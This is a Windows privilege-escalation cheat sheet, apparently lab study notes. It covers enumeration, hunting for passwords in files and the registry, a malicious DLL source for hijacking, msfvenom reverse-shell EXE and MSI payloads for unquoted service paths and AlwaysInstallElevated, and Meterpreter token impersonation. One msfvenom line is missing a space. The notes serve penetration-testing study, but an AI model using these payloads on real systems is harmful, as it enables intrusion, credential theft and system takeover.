# Windows

## Scripts

- WinPEAS -> [Link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- PowerUp -> [Link](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- Windows Exploit Suggester -> [Link](https://github.com/bitsadmin/wesng)

## User enumeration

```console
Current user privileges:
$ whoami /priv

List users:
$ net users

List details of a user:
$ net user <username>

Other logged in Users:
$ qwinsta

User group on system:
$ net localgroup

List memers of a specific group:
$ net localgroup <groupname>
```

## System information

```console
$ systeminfo
$ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

$ hostname
```

## Searching files

```console
$ findstr /si password *.txt
findstr: Searches for patterns of text in files.
/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
password: The command will search for the string “password” in files
*.txt: The search will cover files that have a .txt extension
```

## Vulnerable Software

```console
$ wmic qfe get Caption,Description,HotFixID,InstalledOn
$ wmic service get name,displayname,pathname,startmode
$ wmic product get name,version,vendor
$ wmic service list brief | findstr  "Running"
```
Check for Vulns :
- Searchsploit
- Metasploit
- Exploit-DB
- Github
- Google

## Network connections

```console
C:\Users\user\Desktop>netstat -ano
-a: Displays all active connections and listening ports on the target system.
-n: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-o: Displays the process ID using each listed connection.

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       68
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1092
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1348
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1636
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2288
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2468
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       780
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING       788
```

Any port listed as “LISTENING” that was not discovered with the external port scan can present a potential local service.

## Sheduled tasks

Like CronTab in Linux
```console
$ schtasks /query /fo LIST /v
```

"C:/Program Files (x86)/ScheduledTask/Events"

## DLL hijacking

Windows follow one og these concepts:
- SafeDllSearchMode enabled:
  - The directory from which the application loaded.
  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
  - The current directory.
  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

- SafeDllSearchMode is disabled
  - The directory from which the application loaded.
  - The current directory.
  - The system directory. Use the GetSystemDirectory function to get the path of this directory.
  - The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
  - The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.
  - The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key.     The App Paths key is not used when computing the DLL search path.

Finding Vulnerarbilities with `ProcMon` or any script like winPEAS
ProcMon needs admin privileges

Creating the malicious DLL file with Payload:

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;

    Payload for changing PW:
    "cmd.exe /k net user jack Password11"
}
```
use minqw compiler to generate dll file:
```
$ apt install gcc-mingw-w64-x86-64
$ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll

start and restart the llsvc
$ sc stop dllsvc & sc start dllsvc
```

## Unquoted Service Path

Check the reffering binary for an executable

```console
$ C:\Users\user>sc qc netlogon
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: netlogon
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\lsass.exe
        LOAD_ORDER_GROUP   : MS_WindowsRemoteValidation
        TAG                : 0
        DISPLAY_NAME       : Netlogon
        DEPENDENCIES       : LanmanWorkstation
        SERVICE_START_NAME : LocalSystem
```

In the example above, when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to C:\Program Files\topservice folder\subservice subfolder\srvc.exe
To the human eye, this path would be merely different than "C:\Program Files\topservice folder\subservice subfolder\srvc.exe". We would understand the service is trying to run srvc.exe.

Windows approaches the matter slightly differently. It knows the service is looking for an executable file, and it will start looking for it. If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. 

However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path. In our example, this would be C:\Program.exe. If program.exe is not available, the second attempt will be to run topservice.exe under C:\Program Files\. If this also fails, another attempt will be made for C:\Program Files\topservice folder\subservice.exe. This process repeats until the executable is found. 

Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 
As you can understand, exploiting an unquoted service path vulnerability will require us to have write permissions to a folder where the service will look for an executable. 

WinPeas or PowerUP detect this Vulnerabilities.

```console
$ wmic service get name,displayname,pathname,startmode

Prints out the running services
```

Create a Payload for reverseshell with msfvenom:
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
- executable name see example above e.g. subservice.exe
```

Upload file and start service:
```console
$ sc start unquotedsvc
```

## Token Impersonation

[Potato Exploits](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
Windows 10 and Server 2016/2019 - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

This access token consists of:
- user SIDs(security identifier)
- group SIDs
- privileges

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

```
PS> whoami /priv

PRIVILEGES INFORMATION                         
----------------------                         

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled  
SeProfileSingleProcessPrivilege Profile single process                    Disabled           
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                                        
SeCreatePagefilePrivilege       Create a pagefile                         Disabled                                        
SeBackupPrivilege               Back up files and directories             Disabled                                                                                 
SeRestorePrivilege              Restore files and directories             Disabled                                                                                 
SeShutdownPrivilege             Shut down the system                      Disabled                                                                                 
SeDebugPrivilege                Debug programs                            Enabled                                                                                   
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                                                                                 
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                                                                  
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                                                                                 
SeUndockPrivilege               Remove computer from docking station      Disabled                                                                                 
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                                                                                 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                                                                  
SeCreateGlobalPrivilege         Create global objects                     Enabled                                                                                  
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                                                                                 
SeTimeZonePrivilege             Change the time zone                      Disabled                                                                                 
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

```console
meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -g

Delegation Tokens Available 
========================================
\                   
BUILTIN\Administrators                   
BUILTIN\IIS_IUSRS                   
BUILTIN\Users                   
NT AUTHORITY\AuthenticatedUsers               
NT AUTHORITY\NTLMAuthentication               
NTAUTHORITY\SERVICE                  
NT AUTHORITY\ThisOrganization               
NT AUTHORITY\WRITE RESTRICTED
...

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do)

```console
meterpreter > ps | grep services
Filtering on 'services'

Process List
============

 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 668  580   services.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\services.exe

 migrate 668
```


## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate msi file:
```
$ msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Execute msi on target:
```
$ C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Password

```console
List saved Creds:
$ cmdkey /list
$ runas /savecred /user:admin reverse_shell.exe

Registry keys:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```